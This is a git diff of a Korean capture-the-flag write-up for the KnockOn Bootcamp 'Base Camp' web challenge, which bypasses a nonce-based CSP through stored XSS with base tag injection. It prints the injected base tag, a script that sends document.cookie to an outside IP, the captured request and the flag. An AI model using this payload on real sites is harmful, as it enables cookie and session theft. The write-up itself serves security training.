@@ -1,48 +1,36 @@
 ---
-title: "[Writeup] Knockon Bootcamp 2nd - 6.1 Base camp"
+title: "KnockOn Bootcamp 2nd - 6.1 Base Camp - Base Tag Injection"
 categories:
   - Web Hacking
 tags:
   - Wargame
-  - Knockon Bootcamp 2nd
-  - Cross Site Scripting
+  - KnockOn Bootcamp 2nd
+  - XSS
   - Stored XSS
-last_modified_at: 2024-09-12T20:20:00-05:00
+  - CSP Bypass
+  - Base Tag Injection
+last_modified_at: 2024-09-13T10:20:00+09:00
 published: true
 ---
-
-|
-
 ## 문제
 
 <http://war.knock-on.org:10014/>
 
-![6.1 Base camp 1](/assets/images/writeup/web-hacking/knock-on/6-1_XSS_1.png)
+![6.1 Base camp 1](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-6-1-xss-1.png)
 
-![6.1 Base camp 2](/assets/images/writeup/web-hacking/knock-on/6_XSS_2.png)
-
+![6.1 Base camp 2](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-6-1-xss-2.png)
 
 ### 목표
 
----
-
 게시판에 악성 스크립트를 추가하여 쿠키 값 탈취하기
 
-|
-
 ### 공격 기법
-
----
 
 Cross Site Scripting
 
 - Stored XSS
-
-|
-
-|
-
-|
+- CSP Bypass
+- Base Tag Injection
 
 ## 문제 코드
 
@@ -90,7 +78,7 @@ nonce = secrets.token_hex(16)
 
 #SCP설정
 @app.after_request
-def set_csp(response): 
+def set_csp(response):
     response.headers['Content-Security-Policy'] = f"script-src 'nonce-{nonce}'"
     return response
 
@@ -120,10 +108,10 @@ def view_post(id):
     post = Post.query.get_or_404(id)
     global nonce
     if '127.0.0.1' == request.remote_addr: #if admin bot
-        
+
         nonce = secrets.token_hex(16)
         return render_template('post.html', post=post, nonce=nonce)
-    
+
     if request.method == 'POST':
         nonce = secrets.token_hex(16)
 
@@ -195,29 +183,15 @@ if __name__ == '__main__':
     app.run(host="0.0.0.0", port=10006, debug=True)
 ```
 
-|
-
-|
-
-|
-
 ## 분석
 
 ### /post
 
----
-
-![6.1 Base camp 3](/assets/images/writeup/web-hacking/knock-on/6-1_XSS_2.png)
+![6.1 Base camp 3](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-6-1-xss-2.png)
 
 `/post`에 `/testcode.js`경로로 설정하는`script`코드가 있음
 
-|
-
-|
-
-|
-
-## Exploit
+## 풀이
 
 ```jsx
 <base href="http://20.41.120.97"/>
@@ -227,8 +201,6 @@ if __name__ == '__main__':
 
 `<base>`태그를 활용하면 페이지 접속 시 `“http://20.41.120.97/testcode.js”`로 이동함
 
-|
-
 ```jsx
 // testcode.js
 
@@ -237,13 +209,7 @@ location.href="http://20.41.120.97:10010/"+document.cookie
 
 서버 루트 경로에 `testcode.js`파일 생성
 
-|
-
-|
-
 ### 결과
-
----
 
 ```sql
 GET /cookie=K0%7Bbase_Address_can_be_modify%7D HTTP/1.1
@@ -256,44 +222,22 @@ Referer: http://localhost:10006/
 Accept-Encoding: gzip, deflate
 ```
 
-|
-
-|
-
-|
-
-## Payload
+## 페이로드
 
 ### content
-
----
 
 ```jsx
 <base href="http://20.41.120.97"/>
 ```
 
-|
-
 ### testcode.js
-
----
 
 ```jsx
 location.href="http://20.41.120.97:10010/"+document.cookie
 ```
 
-|
-
-|
-
 ### FLAG
-
----
 
 ```jsx
 K0{base_Address_can_be_modify}
 ```
-
-|
-
----
